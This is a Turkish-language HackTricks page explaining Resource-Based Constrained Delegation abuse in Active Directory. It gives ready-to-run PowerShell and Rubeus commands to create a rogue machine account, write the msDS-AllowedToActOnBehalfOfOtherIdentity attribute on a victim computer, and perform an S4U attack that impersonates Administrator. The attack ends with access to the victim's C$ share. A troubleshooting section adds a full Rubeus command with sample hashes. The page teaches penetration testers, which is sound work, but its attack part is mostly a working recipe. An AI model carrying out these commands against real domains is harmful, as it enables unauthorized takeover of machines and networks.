# Kaynağa Dayalı Kısıtlı Delegasyon

{{#include ../../banners/hacktricks-training.md}}


## Kaynağa Dayalı Kısıtlı Delegasyonun Temelleri

Bu, temel [Kısıtlı Delegasyon](constrained-delegation.md) ile benzerdir ancak **bir nesneye** **bir hizmete karşı herhangi bir kullanıcıyı taklit etme** izni vermek yerine, Kaynağa Dayalı Kısıtlı Delegasyon **nesne üzerinde herhangi bir kullanıcıyı taklit etme yetkisini belirler**.

Bu durumda, kısıtlı nesne, herhangi bir kullanıcıyı taklit edebilecek kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adlı bir niteliğe sahip olacaktır.

Bu Kısıtlı Delegasyonun diğer delegasyonlardan önemli bir farkı, **makine hesabı üzerinde yazma izinlerine sahip** herhangi bir kullanıcının (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ değerini ayarlayabilmesidir (Diğer Delegasyon türlerinde alan adı yöneticisi ayrıcalıkları gerekiyordu).

### Yeni Kavramlar

Kısıtlı Delegasyonda, kullanıcının _userAccountControl_ değerinde **`TrustedToAuthForDelegation`** bayrağının **S4U2Self** gerçekleştirmek için gerekli olduğu belirtilmişti. Ancak bu tamamen doğru değildir.\
Gerçek şu ki, o değer olmadan bile, eğer bir **hizmet** (bir SPN'e sahipseniz) iseniz, herhangi bir kullanıcıya karşı **S4U2Self** gerçekleştirebilirsiniz, ancak eğer **`TrustedToAuthForDelegation`** varsa, dönen TGS **İleri Yönlendirilebilir** olacak ve eğer o bayrağa sahip değilseniz, dönen TGS **İleri Yönlendirilemez** olacaktır.

Ancak, **S4U2Proxy**'de kullanılan **TGS** **İleri Yönlendirilebilir DEĞİLSE**, temel bir **Kısıtlı Delegasyonu** kötüye kullanmaya çalışmak **çalışmayacaktır**. Ancak bir **Kaynağa Dayalı kısıtlı delegasyonu** istismar etmeye çalışıyorsanız, bu **çalışacaktır** (bu bir güvenlik açığı değil, görünüşe göre bir özelliktir).

### Saldırı Yapısı

> Eğer bir **Bilgisayar** hesabı üzerinde **eşdeğer yazma ayrıcalıklarına** sahipseniz, o makinede **ayrılmış erişim** elde edebilirsiniz.

Saldırganın zaten **kurban bilgisayar üzerinde eşdeğer yazma ayrıcalıklarına** sahip olduğunu varsayalım.

1. Saldırgan, bir **SPN**'ye sahip bir hesabı **ele geçirir** veya **oluşturur** (“Hizmet A”). Herhangi bir _Yönetici Kullanıcı_ özel bir ayrıcalığa sahip olmadan **10'a kadar Bilgisayar nesnesi** (**_MachineAccountQuota_**) **oluşturabilir** ve bunlara bir **SPN** ayarlayabilir. Bu nedenle, saldırgan sadece bir Bilgisayar nesnesi oluşturup bir SPN ayarlayabilir.
2. Saldırgan, kurban bilgisayar (ServiceB) üzerindeki **yazma ayrıcalığını** kötüye kullanarak **Kaynağa dayalı kısıtlı delegasyonu, ServiceA'nın o kurban bilgisayar (ServiceB) üzerinde herhangi bir kullanıcıyı taklit etmesine izin verecek şekilde** yapılandırır.
3. Saldırgan, **Service B**'ye **ayrılmış erişime** sahip bir kullanıcı için **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus'u kullanır.
1. S4U2Self (ele geçirilen/oluşturulan SPN'den): **Yönetici için bana bir TGS iste** (İleri Yönlendirilemez).
2. S4U2Proxy: Önceki adımda **İleri Yönlendirilemez TGS**'yi kullanarak **kurban ana bilgisayara** **Yönetici**'den bir **TGS** talep et.
3. İleri Yönlendirilemez bir TGS kullanıyor olsanız bile, Kaynağa dayalı kısıtlı delegasyonu istismar ettiğiniz için bu **çalışacaktır**.
4. Saldırgan, **bilet geçişi** yapabilir ve kullanıcıyı **kurban ServiceB'ye erişim sağlamak için taklit edebilir**.

Alan adının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bir Bilgisayar Nesnesi Oluşturma

Bir alan içinde bir bilgisayar nesnesi oluşturmak için [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kaynak Tabanlı Kısıtlı Delegasyonu Yapılandırma

**activedirectory PowerShell modülünü kullanarak**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Powerview Kullanımı**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Tam bir S4U saldırısı gerçekleştirme

Öncelikle, `123456` şifresiyle yeni bir Bilgisayar nesnesi oluşturduk, bu yüzden o şifrenin hash'ine ihtiyacımız var:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, o hesap için RC4 ve AES hash'lerini yazdıracaktır.\
Şimdi, saldırı gerçekleştirilebilir:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak sadece bir kez istekte bulunarak daha fazla bilet oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kullanıcıların "**Delege edilemez**" adında bir özelliği olduğunu unutmayın. Eğer bir kullanıcının bu özelliği True ise, onu taklit edemezsiniz. Bu özellik bloodhound içinde görülebilir.

### Erişim

Son komut satırı, **tam S4U saldırısını gerçekleştirecek ve TGS'yi** Administrator'dan kurban makinesine **belleğe** enjekte edecektir.\
Bu örnekte, Administrator'dan **CIFS** servisi için bir TGS talep edilmiştir, böylece **C$**'ye erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı hizmet biletlerini kötüye kullanma

[**mevcut hizmet biletlerini buradan öğrenin**](silver-ticket.md#available-services).

## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'ini sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini (veya sadece rc4, aes128 ve aes256 hash'lerini sağlayın) verin. Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın zamanının DC'nin zamanından farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin giriş yapmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Bu, şunları ifade edebilir:
  - Taklit etmeye çalıştığınız kullanıcı, istenen hizmete erişemiyor (çünkü onu taklit edemezsiniz veya yeterli ayrıcalıklara sahip değildir)
  - İstenen hizmet mevcut değil (eğer winrm için bir bilet isterseniz ama winrm çalışmıyorsa)
  - Oluşturulan fakecomputer, hedef sunucu üzerindeki ayrıcalıklarını kaybetmiştir ve bunları geri vermeniz gerekir.

## Referanslar

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)


{{#include ../../banners/hacktricks-training.md}}
